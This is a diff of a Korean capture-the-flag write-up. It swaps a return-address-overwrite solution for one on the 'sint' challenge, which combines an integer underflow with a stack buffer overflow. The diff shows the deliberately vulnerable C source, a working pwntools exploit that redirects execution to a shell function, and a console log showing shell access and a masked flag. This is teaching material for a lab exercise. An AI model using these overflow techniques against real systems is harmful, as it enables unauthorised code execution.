@@ -1,104 +1,106 @@
-# Write-up 01 | Pwnable
-
 ## 개요
 
 - 분야: Pwnable
-- 주제: Stack Buffer Overflow
+- 주제: Integer Underflow + Stack Buffer Overflow
 - 환경: Linux
 
 ## 분석
 
+
 ----------------------------------------------------------------------------------------
-## Return Address Overwrite의 C코드
+
+## sint의 C코드
 
 ```c
 #include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
 #include <unistd.h>
 
-void init() {
-  setvbuf(stdin, 0, 2, 0);
-  setvbuf(stdout, 0, 2, 0);
+void alarm_handler()
+{
+    puts("TIME OUT");
+    exit(-1);
 }
 
-void get_shell() {
-  char *cmd = "/bin/sh";
-  char *args[] = {cmd, NULL};
+void initialize()
+{
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
 
-  execve(cmd, args, NULL);
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
 }
 
-int main() {
-  char buf[0x28];
+void get_shell()
+{
+    system("/bin/sh");
+}
 
-  init();
+int main()
+{
+    char buf[256];
+    int size;
 
-  printf("Input: ");
-  scanf("%s", buf);
+    initialize();
 
-  return 0;
+    signal(SIGSEGV, get_shell);
+
+    printf("Size: ");
+    scanf("%d", &size);
+
+    if (size > 256 || size < 0)
+    {
+        printf("Buffer Overflow!\n");
+        exit(0);
+    }
+
+    printf("Data: ");
+    read(0, buf, size - 1);
+
+    return 0;
 }
 ```
+이 코드를 보면 SIGSEGV. 세그먼트 에러를 내면 get_shell이 나온다는것을 알수있다. 또 size > 256 || size < 0 이 구문과 read(0, buf, size - 1); 으로 인해 size = 0인것을 알수 있다.
 
 ----------------------------------------------------------------------------------------
-## 어셈블리
 
-```asm
-0x00000000004006e8 <+0>:  push   rbp
-0x00000000004006e9 <+1>:  mov    rbp, rsp
-0x00000000004006ec <+4>:  sub    rsp, 0x30
-0x00000000004006f0 <+8>:  mov    eax, 0x0
-0x00000000004006f5 <+13>: call   0x400667
-0x00000000004006fa <+18>: lea    rdi, [rip+0xbb]
-0x0000000000400701 <+25>: mov    eax, 0x0
-0x0000000000400706 <+30>: call   0x400540 <printf@plt>
-0x000000000040070b <+35>: lea    rax, [rbp-0x30]
-0x000000000040070f <+39>: mov    rsi, rax
-0x0000000000400712 <+42>: lea    rdi, [rip+0xab]
-0x0000000000400719 <+49>: mov    eax, 0x0
-0x000000000040071e <+54>: call   0x400570 <__isoc99_scanf@plt>
-0x0000000000400723 <+59>: mov    eax, 0x0
-0x0000000000400728 <+64>: leave
-0x0000000000400729 <+65>: ret
-```
-  
-  어셈블리에서 <+4>영역을 보면 sub  rsp, 0x30. 크기가 0x30인것을 알수있다. C언어를 보면 buf = 0x28이므로
-  buf(0x28) | 여유공간(0x08) | rbp | ret 으로 이루어져있다는것을 알수 있다.
-  또한 gdb의 명령어인 info address로 get_shell의 명령어가 0x4006aa인것을 알수있다.
-
-----------------------------------------------------------------------------------------
 ## Exploit
 
 ```Py
 from pwn import *
 
-r = remote("host3.dreamhack.games", 21153)
+r = remote("host3.dreamhack.games", 16974)
+elf = ELF('./sint')
+get_shell = elf.symbols["get_shell"]
 
-payload = b"A"*0x30
-payload += b"B"*0x8
-payload += p64(0x4006aa)
+r.sendline(b'0')
+r.sendline(b'A' * (0x100 + 0x4) + p32(get_shell))
 
-r.recvuntil('Input: ')
-
-r.sendline(payload)
 r.interactive()
 ```
 
-pwntools로 페이로드를 Input: 에 보내보았다
-----------------------------------------------------------------------------------------
-# 결과
+연결후 sint를 ELF로 elf변수에 저장, get_shell변수에 get_shell의 주소 저장. size = 0을 보낸뒤
+A를 바이트로 A * 256 + 4 + get_shell의 주소를 32바이트로 패킹하여 보냄. 이후 직접 입력모드로 전환.
 
-```console
-jjang@wjw:/mnt/c/Users/jjang/Downloads/08861c22-4c49-4a28-988f-297575aa6837$ python3 solve.py
-[+] Opening connection to host3.dreamhack.games on port 9633: Done
-/mnt/c/Users/jjang/Downloads/08861c22-4c49-4a28-988f-297575aa6837/solve.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees.
-  r.recvuntil('Input: ')
-[*] Switching to interactive mode
-$ ls
-flag
-rao
-run.sh
-$ cat flag
-DH{□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□}
-$
-```
 ----------------------------------------------------------------------------------------
+
+## 결과
+```console
+jjang@wjw:/mnt/c/Users/jjang/Downloads/73113828-8514-40bc-81fe-bdabf107e126$ python3 s.py
+[+] Opening connection to host3.dreamhack.games on port 16974: Done
+[*] '/mnt/c/Users/jjang/Downloads/73113828-8514-40bc-81fe-bdabf107e126/sint'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+[*] Switching to interactive mode
+Size: Data: $ ls
+flag
+sint
+$ cat flag
+DH{□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□}$
+```
+플레그가 정상적으로 출력 되었다.
